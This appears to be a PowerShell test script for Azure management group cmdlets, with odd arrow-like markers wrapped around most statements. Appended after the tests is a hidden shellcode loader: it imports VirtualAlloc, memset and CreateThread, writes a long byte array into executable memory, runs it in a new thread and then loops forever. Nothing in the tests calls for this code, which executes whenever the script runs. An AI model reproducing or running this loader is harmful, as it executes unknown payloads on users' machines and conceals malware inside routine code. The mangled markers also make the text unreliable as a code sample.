















 -||-> function Test-GetManagementGroup
{
	 -||-> New-AzManagementGroup -GroupName TestPSGetGroup1 <-||- 
	 -||-> New-AzManagementGroup -GroupName TestPSGetGroup2 -ParentId "/providers/Microsoft.Management/managementGroups/TestPSGetGroup1" <-||- 

	 -||-> $response =  -||-> Get-AzManagementGroup -GroupName TestPSGetGroup2 <-||-  <-||- 

	 -||-> Remove-AzManagementGroup -GroupName TestPSGetGroup2 <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSGetGroup1 <-||- 

	 -||-> $expectedType =  "/providers/Microsoft.Management/managementGroups" <-||- 
	 -||-> $expectedId = "/providers/Microsoft.Management/managementGroups/TestPSGetGroup2" <-||- 
	 -||-> $expectedName = "TestPSGetGroup2" <-||- 
	 -||-> $expectedDisplayName = "TestPSGetGroup2" <-||- 
	 -||-> $expectedParentId = "/providers/Microsoft.Management/managementGroups/TestPSGetGroup1" <-||- 
	 -||-> $expectedParentDisplayName = "TestPSGetGroup1" <-||- 
	 -||-> $expectedParentName = "TestPSGetGroup1" <-||- 

	 -||-> Assert-NotNull $response <-||- 
	 -||-> Assert-Null $response.Children <-||- 
	 -||-> Assert-AreEqual $response.Type $expectedType <-||- 
	 -||-> Assert-AreEqual $response.Id $expectedId <-||- 
	 -||-> Assert-AreEqual $response.Name $expectedName <-||- 
	 -||-> Assert-AreEqual $response.DisplayName $expectedDisplayName <-||- 
	 -||-> Assert-AreEqual $response.ParentId $expectedParentId <-||- 
	 -||-> Assert-AreEqual $response.ParentDisplayName $expectedParentDisplayName <-||- 
	 -||-> Assert-AreEqual $response.ParentName $expectedParentName <-||- 
} <-||- 

 -||-> function Test-GetManagementGroupWithExpand
{
	 -||-> New-AzManagementGroup -GroupName TestPSGetGroup1 <-||- 
	 -||-> New-AzManagementGroup -GroupName TestPSGetGroup2 -ParentId "/providers/Microsoft.Management/managementGroups/TestPSGetGroup1" <-||- 
	 -||-> New-AzManagementGroup -GroupName TestPSGetGroup3 -ParentId "/providers/Microsoft.Management/managementGroups/TestPSGetGroup2" <-||- 

	 -||-> $response =  -||-> Get-AzManagementGroup -GroupName TestPSGetGroup2 -Expand <-||-  <-||- 

	 -||-> Remove-AzManagementGroup -GroupName TestPSGetGroup3 <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSGetGroup2 <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSGetGroup1 <-||- 

	 -||-> $expectedType =  "/providers/Microsoft.Management/managementGroups" <-||- 
	 -||-> $expectedId = "/providers/Microsoft.Management/managementGroups/TestPSGetGroup2" <-||- 
	 -||-> $expectedName = "TestPSGetGroup2" <-||- 
	 -||-> $expectedDisplayName = "TestPSGetGroup2" <-||- 
	 -||-> $expectedParentId = "/providers/Microsoft.Management/managementGroups/TestPSGetGroup1" <-||- 
	 -||-> $expectedParentDisplayName = "TestPSGetGroup1" <-||- 
	 -||-> $expectedParentName = "TestPSGetGroup1" <-||- 

	 -||-> $expectedChild0Id = "/providers/Microsoft.Management/managementGroups/TestPSGetGroup3" <-||- 
	 -||-> $expectedChild0DisplayName = "TestPSGetGroup3" <-||- 
	 -||-> $expectedChild0Name = "TestPSGetGroup3" <-||- 

	 -||-> Assert-NotNull $response <-||- 
	 -||-> Assert-NotNull $response.Children <-||- 

	 -||-> Assert-AreEqual $response.Type $expectedType <-||- 
	 -||-> Assert-AreEqual $response.Id $expectedId <-||- 
	 -||-> Assert-AreEqual $response.Name $expectedName <-||- 
	 -||-> Assert-AreEqual $response.DisplayName $expectedDisplayName <-||- 
	 -||-> Assert-AreEqual $response.ParentId $expectedParentId <-||- 
	 -||-> Assert-AreEqual $response.ParentDisplayName $expectedParentDisplayName <-||- 
	 -||-> Assert-AreEqual $response.ParentName $expectedParentName <-||- 

	 -||-> Assert-AreEqual $response.Children[0].Type $expectedType <-||- 
	 -||-> Assert-AreEqual $response.Children[0].Id $expectedChild0Id <-||- 
	 -||-> Assert-AreEqual $response.Children[0].DisplayName $expectedChild0DisplayName <-||- 
	 -||-> Assert-AreEqual $response.Children[0].Name $expectedChild0Name <-||- 
} <-||- 

 -||-> function Test-GetManagementGroupWithExpandAndRecurse
{
	 -||-> New-AzManagementGroup -GroupName TestPSGetGroup1 <-||- 
	 -||-> New-AzManagementGroup -GroupName TestPSGetGroup2 -ParentId "/providers/Microsoft.Management/managementGroups/TestPSGetGroup1" <-||- 
	 -||-> New-AzManagementGroup -GroupName TestPSGetGroup3 -ParentId "/providers/Microsoft.Management/managementGroups/TestPSGetGroup2" <-||- 
	 -||-> New-AzManagementGroup -GroupName TestPSGetGroup4 -ParentId "/providers/Microsoft.Management/managementGroups/TestPSGetGroup3" <-||- 

	 -||-> $response =  -||-> Get-AzManagementGroup -GroupName TestPSGetGroup2 -Expand -Recurse <-||-  <-||- 

	 -||-> Remove-AzManagementGroup -GroupName TestPSGetGroup4 <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSGetGroup3 <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSGetGroup2 <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSGetGroup1 <-||- 

	 -||-> $expectedType =  "/providers/Microsoft.Management/managementGroups" <-||- 
	 -||-> $expectedId = "/providers/Microsoft.Management/managementGroups/TestPSGetGroup2" <-||- 
	 -||-> $expectedName = "TestPSGetGroup2" <-||- 
	 -||-> $expectedDisplayName = "TestPSGetGroup2" <-||- 
	 -||-> $expectedParentId = "/providers/Microsoft.Management/managementGroups/TestPSGetGroup1" <-||- 
	 -||-> $expectedParentDisplayName = "TestPSGetGroup1" <-||- 
	 -||-> $expectedParentName = "TestPSGetGroup1" <-||- 

	 -||-> $expectedChild0Id = "/providers/Microsoft.Management/managementGroups/TestPSGetGroup3" <-||- 
	 -||-> $expectedChild0DisplayName = "TestPSGetGroup3" <-||- 
	 -||-> $expectedChild0Name = "TestPSGetGroup3" <-||- 

	 -||-> $expectedChild0Child0Id = "/providers/Microsoft.Management/managementGroups/TestPSGetGroup4" <-||- 
	 -||-> $expectedChild0Child0DisplayName = "TestPSGetGroup4" <-||- 
	 -||-> $expectedChild0Child0Name = "TestPSGetGroup4" <-||- 

	 -||-> Assert-NotNull $response <-||- 
	 -||-> Assert-NotNull $response.Children <-||- 

	 -||-> Assert-AreEqual $response.Type $expectedType <-||- 
	 -||-> Assert-AreEqual $response.Id $expectedId <-||- 
	 -||-> Assert-AreEqual $response.Name $expectedName <-||- 
	 -||-> Assert-AreEqual $response.DisplayName $expectedDisplayName <-||- 
	 -||-> Assert-AreEqual $response.ParentId $expectedParentId <-||- 
	 -||-> Assert-AreEqual $response.ParentDisplayName $expectedParentDisplayName <-||- 
	 -||-> Assert-AreEqual $response.ParentName $expectedParentName <-||- 

	 -||-> Assert-AreEqual $response.Children[0].Type $expectedType <-||- 
	 -||-> Assert-AreEqual $response.Children[0].Id $expectedChild0Id <-||- 
	 -||-> Assert-AreEqual $response.Children[0].DisplayName $expectedChild0DisplayName <-||- 
	 -||-> Assert-AreEqual $response.Children[0].Name $expectedChild0Name <-||- 

	 -||-> Assert-AreEqual $response.Children[0].Children[0].Type $expectedType <-||- 
	 -||-> Assert-AreEqual $response.Children[0].Children[0].Id $expectedChild0Child0Id <-||- 
	 -||-> Assert-AreEqual $response.Children[0].Children[0].DisplayName $expectedChild0Child0DisplayName <-||- 
	 -||-> Assert-AreEqual $response.Children[0].Children[0].Name $expectedChild0Child0Name <-||- 
} <-||- 

 -||-> function Test-NewManagementGroup
{
     -||-> $response =  -||-> New-AzManagementGroup -GroupName TestPSNewGroup <-||-  <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSNewGroup <-||- 

	 -||-> $expectedType =  "/providers/Microsoft.Management/managementGroups" <-||- 
	 -||-> $expectedId = "/providers/Microsoft.Management/managementGroups/TestPSNewGroup" <-||- 
	 -||-> $expectedName = "TestPSNewGroup" <-||- 
	 -||-> $expectedDisplayName = "TestPSNewGroup" <-||- 

	 -||-> Assert-AreEqual $response.Type $expectedType <-||- 
	 -||-> Assert-AreEqual $response.Id $expectedId <-||- 
	 -||-> Assert-AreEqual $response.Name $expectedName <-||- 
	 -||-> Assert-AreEqual $response.DisplayName $expectedDisplayName <-||- 
	 -||-> Assert-NotNull $response.ParentId <-||-  
	 -||-> Assert-NotNull $response.ParentDisplayName <-||-  

} <-||- 

 -||-> function Test-NewManagementGroupWithDisplayName
{
     -||-> $response =  -||-> New-AzManagementGroup -GroupName TestPSNewGroup2 -DisplayName TestDisplayName <-||-  <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSNewGroup2 <-||- 

	 -||-> $expectedType =  "/providers/Microsoft.Management/managementGroups" <-||- 
	 -||-> $expectedId = "/providers/Microsoft.Management/managementGroups/TestPSNewGroup2" <-||- 
	 -||-> $expectedName = "TestPSNewGroup2" <-||- 
	 -||-> $expectedDisplayName = "TestDisplayName" <-||- 

	 -||-> Assert-AreEqual $response.Type $expectedType <-||- 
	 -||-> Assert-AreEqual $response.Id $expectedId <-||- 
	 -||-> Assert-AreEqual $response.Name $expectedName <-||- 
	 -||-> Assert-AreEqual $response.DisplayName $expectedDisplayName <-||- 
	 -||-> Assert-NotNull $response.ParentId <-||-  
	 -||-> Assert-NotNull $response.ParentDisplayName <-||-  
} <-||- 

 -||-> function Test-NewManagementGroupWithParentId
{
	 -||-> New-AzManagementGroup -GroupName TestParent5 <-||- 
     -||-> $response =  -||-> New-AzManagementGroup -GroupName TestPSNewGroup5 -ParentId /providers/Microsoft.Management/managementGroups/TestParent5 <-||-  <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSNewGroup5 <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestParent5 <-||- 

	 -||-> $expectedType =  "/providers/Microsoft.Management/managementGroups" <-||- 
	 -||-> $expectedId = "/providers/Microsoft.Management/managementGroups/TestPSNewGroup5" <-||- 
	 -||-> $expectedName = "TestPSNewGroup5" <-||- 
	 -||-> $expectedDisplayName = "TestPSNewGroup5" <-||- 
	 -||-> $expectedParentId = "/providers/Microsoft.Management/managementGroups/TestParent5" <-||- 
	 -||-> $expectedParentDisplayName = "TestParent5" <-||- 

	 -||-> Assert-AreEqual $response.Type $expectedType <-||- 
	 -||-> Assert-AreEqual $response.Id $expectedId <-||- 
	 -||-> Assert-AreEqual $response.Name $expectedName <-||- 
	 -||-> Assert-AreEqual $response.DisplayName $expectedDisplayName <-||- 
	 -||-> Assert-AreEqual $response.ParentId $expectedParentId <-||- 
	 -||-> Assert-AreEqual $response.ParentDisplayName $expectedParentDisplayName <-||- 
} <-||- 

 -||-> function Test-NewManagementGroupWithDisplayNameAndParentId
{
	 -||-> New-AzManagementGroup -GroupName TestParent4 <-||- 
     -||-> $response =  -||-> New-AzManagementGroup -GroupName TestPSGroup4 -DisplayName TestDisplayName -ParentId /providers/Microsoft.Management/managementGroups/TestParent4 <-||-  <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSGroup4 <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestParent4 <-||- 

	 -||-> $expectedType =  "/providers/Microsoft.Management/managementGroups" <-||- 
	 -||-> $expectedId = "/providers/Microsoft.Management/managementGroups/TestPSGroup4" <-||- 
	 -||-> $expectedName = "TestPSGroup4" <-||- 
	 -||-> $expectedDisplayName = "TestDisplayName" <-||- 
	 -||-> $expectedParentId = "/providers/Microsoft.Management/managementGroups/TestParent4" <-||- 
	 -||-> $expectedParentDisplayName = "TestParent4" <-||- 

	 -||-> Assert-AreEqual $response.Type $expectedType <-||- 
	 -||-> Assert-AreEqual $response.Id $expectedId <-||- 
	 -||-> Assert-AreEqual $response.Name $expectedName <-||- 
	 -||-> Assert-AreEqual $response.DisplayName $expectedDisplayName <-||- 
	 -||-> Assert-AreEqual $response.ParentId $expectedParentId <-||- 
	 -||-> Assert-AreEqual $response.ParentDisplayName $expectedParentDisplayName <-||- 
} <-||- 

 -||-> function Test-UpdateManagementGroupWithDisplayName
{
	 -||-> New-AzManagementGroup -GroupName TestPSUpdateGroup1 <-||- 
     -||-> $response =  -||-> Update-AzManagementGroup -GroupName TestPSUpdateGroup1 -DisplayName TestDisplayName <-||-  <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSUpdateGroup1 <-||- 

	 -||-> $expectedType =  "/providers/Microsoft.Management/managementGroups" <-||- 
	 -||-> $expectedId = "/providers/Microsoft.Management/managementGroups/TestPSUpdateGroup1" <-||- 
	 -||-> $expectedName = "TestPSUpdateGroup1" <-||- 
	 -||-> $expectedDisplayName = "TestDisplayName" <-||- 

	 -||-> Assert-AreEqual $response.Type $expectedType <-||- 
	 -||-> Assert-AreEqual $response.Id $expectedId <-||- 
	 -||-> Assert-AreEqual $response.Name $expectedName <-||- 
	 -||-> Assert-AreEqual $response.DisplayName $expectedDisplayName <-||- 
} <-||- 

 -||-> function Test-UpdateManagementGroupWithParentId
{
	 -||-> New-AzManagementGroup -GroupName TestPSUpdateGroupParent2 <-||- 
	 -||-> New-AzManagementGroup -GroupName TestPSUpdateGroup2 <-||- 
     -||-> $response =  -||-> Update-AzManagementGroup -GroupName TestPSUpdateGroup2 -ParentId /providers/Microsoft.Management/managementGroups/TestPSUpdateGroupParent2 <-||-  <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSUpdateGroup2 <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSUpdateGroupParent2 <-||- 

	 -||-> $expectedType =  "/providers/Microsoft.Management/managementGroups" <-||- 
	 -||-> $expectedId = "/providers/Microsoft.Management/managementGroups/TestPSUpdateGroup2" <-||- 
	 -||-> $expectedName = "TestPSUpdateGroup2" <-||- 
	 -||-> $expectedDisplayName = "TestPSUpdateGroup2" <-||- 
	 -||-> $expectedParentId = "/providers/Microsoft.Management/managementGroups/TestPSUpdateGroupParent2" <-||- 
	 -||-> $expectedParentDisplayName = "TestPSUpdateGroupParent2" <-||- 

	 -||-> Assert-AreEqual $response.Type $expectedType <-||- 
	 -||-> Assert-AreEqual $response.Id $expectedId <-||- 
	 -||-> Assert-AreEqual $response.Name $expectedName <-||- 
	 -||-> Assert-AreEqual $response.DisplayName $expectedDisplayName <-||- 
	 -||-> Assert-AreEqual $response.ParentId $expectedParentId <-||- 
	 -||-> Assert-AreEqual $response.ParentDisplayName $expectedParentDisplayName <-||- 
} <-||- 

 -||-> function Test-UpdateManagementGroupWithDisplayNameAndParentId
{
	 -||-> New-AzManagementGroup -GroupName TestPSUpdateGroupParent3 <-||- 
	 -||-> New-AzManagementGroup -GroupName TestPSUpdateGroup3 <-||- 
     -||-> $response =  -||-> Update-AzManagementGroup -GroupName TestPSUpdateGroup3 -DisplayName TestDisplayName -ParentId /providers/Microsoft.Management/managementGroups/TestPSUpdateGroupParent3 <-||-  <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSUpdateGroup3 <-||- 
	 -||-> Remove-AzManagementGroup -GroupName TestPSUpdateGroupParent3 <-||- 

	 -||-> $expectedType =  "/providers/Microsoft.Management/managementGroups" <-||- 
	 -||-> $expectedId = "/providers/Microsoft.Management/managementGroups/TestPSUpdateGroup3" <-||- 
	 -||-> $expectedName = "TestPSUpdateGroup3" <-||- 
	 -||-> $expectedDisplayName = "TestDisplayName" <-||- 
	 -||-> $expectedParentId = "/providers/Microsoft.Management/managementGroups/TestPSUpdateGroupParent3" <-||- 
	 -||-> $expectedParentDisplayName = "TestPSUpdateGroupParent3" <-||- 

	 -||-> Assert-AreEqual $response.Type $expectedType <-||- 
	 -||-> Assert-AreEqual $response.Id $expectedId <-||- 
	 -||-> Assert-AreEqual $response.Name $expectedName <-||- 
	 -||-> Assert-AreEqual $response.DisplayName $expectedDisplayName <-||- 
	 -||-> Assert-AreEqual $response.ParentId $expectedParentId <-||- 
	 -||-> Assert-AreEqual $response.ParentDisplayName $expectedParentDisplayName <-||- 
} <-||- 

 -||-> function Test-RemoveManagementGroup
{
	 -||-> New-AzManagementGroup -GroupName TestPSRemoveGroup <-||- 
	
	 -||-> $getresponse =  -||-> Get-AzManagementGroup -GroupName TestPSRemoveGroup <-||-  <-||- 

     -||-> $response =  -||-> Remove-AzManagementGroup -GroupName TestPSRemoveGroup <-||-  <-||- 

	 -||-> $getresponse2 =  -||-> Get-AzManagementGroup -GroupName TestPSRemoveGroup <-||-  <-||- 

	 -||-> Assert-NotNull $getresponse <-||- 
	 -||-> Assert-Null $getresponse2 <-||- 
	 -||-> Assert-Null $response <-||- 
} <-||- 

 -||-> function Test-NewRemoveManagementGroupSubscription
{
	 -||-> New-AzManagementGroup -GroupName TestSubGroup <-||- 

	 -||-> $response1 =  -||-> New-AzManagementGroupSubscription -GroupName TestSubGroup -SubscriptionId 394ae65d-9e71-4462-930f-3332dedf845c <-||-  <-||- 

	 -||-> $getresponse =  -||-> Get-AzManagementGroup -GroupName TestSubGroup -Expand <-||-  <-||- 

	 -||-> $response2 =  -||-> Remove-AzManagementGroupSubscription -GroupName TestSubGroup -SubscriptionId 394ae65d-9e71-4462-930f-3332dedf845c <-||-  <-||- 
	
	 -||-> $getresponse2 =  -||-> Get-AzManagementGroup -GroupName TestSubGroup -Expand <-||-  <-||- 

	 -||-> Remove-AzManagementGroup -GroupName TestSubGroup <-||- 

	 -||-> $expectedType =  "/subscriptions" <-||- 
	 -||-> $expectedId = "/subscriptions/394ae65d-9e71-4462-930f-3332dedf845c" <-||- 
	 -||-> $expectedName = "394ae65d-9e71-4462-930f-3332dedf845c" <-||- 
	 -||-> $expectedDisplayName = "Pay-As-You-Go" <-||- 

	 -||-> Assert-AreEqual $getresponse.Children[0].Type $expectedType <-||- 
	 -||-> Assert-AreEqual $getresponse.Children[0].Id $expectedId <-||- 
	 -||-> Assert-AreEqual $getresponse.Children[0].DisplayName $expectedDisplayName <-||- 
	 -||-> Assert-AreEqual $getresponse.Children[0].Name $expectedName <-||- 

	 -||-> Assert-Null $response1 <-||- 
	 -||-> Assert-Null $response2 <-||- 
	 -||-> Assert-Null $getresponse2.Children <-||- 
} <-||- 


 -||-> $O2av = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $O2av -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xdd,0xc5,0xd9,0x74,0x24,0xf4,0xbf,0xfb,0x2e,0xf0,0xb5,0x58,0x29,0xc9,0xb1,0x6e,0x83,0xe8,0xfc,0x31,0x78,0x16,0x03,0x78,0x16,0xe2,0x0e,0xd2,0x18,0x3c,0xf0,0x2b,0xd9,0x5f,0x79,0xce,0xe8,0x4d,0x1d,0x9a,0x59,0x42,0x56,0xce,0x51,0x29,0x3a,0xfb,0xe2,0x5f,0x92,0x0c,0x42,0xd5,0xc4,0x23,0x53,0xdb,0xc8,0xe8,0x97,0x7d,0xb4,0xf2,0xcb,0x5d,0x85,0x3c,0x1e,0x9f,0xc2,0x21,0xd1,0xcd,0x9b,0x2e,0x40,0xe2,0xa8,0x73,0x59,0x03,0x7e,0xf8,0xe1,0x7b,0xfb,0x3f,0x95,0x31,0x02,0x10,0x06,0x4d,0x4c,0x88,0x2c,0x09,0x6c,0xa9,0xe1,0x49,0x50,0xe0,0x8e,0xba,0x23,0xf3,0x46,0xf3,0xcc,0xc5,0xa6,0x58,0xf3,0xe9,0x2a,0xa0,0x34,0xcd,0xd4,0xd7,0x4e,0x2d,0x68,0xe0,0x95,0x4f,0xb6,0x65,0x0b,0xf7,0x3d,0xdd,0xef,0x09,0x91,0xb8,0x64,0x05,0x5e,0xce,0x22,0x0a,0x61,0x03,0x59,0x36,0xea,0xa2,0x8d,0xbe,0xa8,0x80,0x09,0x9a,0x6b,0xa8,0x08,0x46,0xdd,0xd5,0x4a,0x2e,0x82,0x73,0x01,0xdd,0xd7,0x02,0x48,0x8a,0x49,0x6e,0x06,0x4a,0xfe,0x07,0x8f,0x24,0x97,0x6e,0xa9,0xed,0x0f,0x3d,0x42,0x28,0xd7,0x42,0x79,0x05,0x28,0xeb,0xd6,0x31,0x81,0x42,0xb0,0x87,0x7b,0x12,0xe7,0x07,0x56,0x0f,0x84,0xac,0x68,0x19,0x1b,0x02,0xe1,0x9a,0xca,0xf5,0x9d,0x27,0xed,0xf5,0x5d,0x0b,0xbd,0x9d,0x0a,0x22,0xa2,0x98,0x4a,0xe1,0x37,0x6b,0xec,0x3b,0x15,0x26,0x66,0x3c,0xab,0x67,0xf2,0x6e,0x99,0x35,0xaa,0xdc,0x4d,0xd2,0xa7,0xb4,0x43,0x19,0xc7,0xe2,0x12,0x9b,0x5d,0x1d,0x7f,0x4c,0x22,0x2e,0x7f,0x8c,0xab,0xb1,0x15,0x88,0xfb,0x5b,0xf6,0xc6,0x93,0xee,0x4e,0x79,0xe5,0xee,0x9b,0xb4,0x15,0x47,0x74,0xe0,0xbe,0x3e,0x12,0x23,0x47,0xa7,0x99,0xc4,0x92,0x52,0x9d,0x4e,0x02,0x16,0x12,0x35,0x40,0xa8,0x2c,0x35,0x52,0x79,0xc5,0xbe,0xa4,0x7a,0x15,0x29,0x08,0x85,0xea,0x56,0x7e,0x00,0x65,0xcb,0xf4,0x80,0xe8,0x25,0x92,0x10,0x97,0x39,0xb7,0x8a,0x66,0xfa,0x18,0x1d,0xe2,0xf8,0xcc,0x9f,0xa2,0x96,0x12,0xca,0x40,0x30,0x7b,0xd0,0xb2,0x64,0x34,0x1b,0xef,0x0a,0xfa,0x23,0x69,0x95,0xf9,0xa0,0x5c,0x21,0x55,0x2a,0xd2,0x8d,0x5e,0x05,0x2a,0x79,0x5d,0x35,0xfb,0xd4,0x0a,0xa7,0x6d,0x51,0x28,0x38,0x44,0xe7,0x6d,0xb3,0x4b,0xb0,0xe8,0xfc,0xe7,0x56,0x99,0xfc,0x53,0x07,0xd0,0xb9,0x7f,0xab,0xba,0x12,0x17,0x9e,0x6d,0x3b,0xbc,0x1f,0x44,0xc0,0xae,0xe4,0x8c,0x09,0x7d,0x8d,0x94,0x00,0x06,0x1f,0xe6,0xf8,0x62,0xa0,0x4f,0x6b,0x43,0x2b,0x00,0xec,0x5c,0xfe,0xb5,0xf2,0xca,0xf1,0xff,0x51,0x5c,0x0d,0x2a,0x7d,0xf0,0x0e,0x2a,0x81,0x8e,0xd4,0xfb,0x18,0x07,0x79,0x61,0xe5,0x3f,0x89,0x96,0x1a,0x40,0xeb,0x46,0x95,0xd1,0x81,0xf0,0x7b,0x4e,0x3b,0x89,0x83 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $Cg1=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $Cg1.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$Cg1,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



